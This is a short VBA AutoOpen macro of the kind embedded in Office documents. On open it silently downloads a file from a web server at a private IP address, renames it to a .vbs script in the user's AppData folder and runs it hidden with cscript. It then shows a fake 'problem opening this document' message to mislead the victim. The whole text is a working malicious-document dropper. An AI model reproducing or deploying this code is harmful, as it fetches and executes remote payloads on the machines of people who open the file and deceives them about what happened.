Sub AutoOpen()
'
' AutoOpen Macro
'
'
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://192.168.0.4:8080/getFile/adb.txt", False
xHttp.Send

With bStrm
    .Type = 1 '//binary
    .Open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\adb.txt", 2 '//overwrite
End With

 Dim shl
 Set shl = CreateObject("WScript.Shell")
 Call shl.Run("%COMSPEC% /c move C:\Users\Public\adb.txt %APPDATA%\adb.vbs", 0, True)
 Call shl.Run("%COMSPEC% /c cscript %APPDATA%\adb.vbs", 0, True)

MsgBox ("There was a problem opening this document.")
End Sub
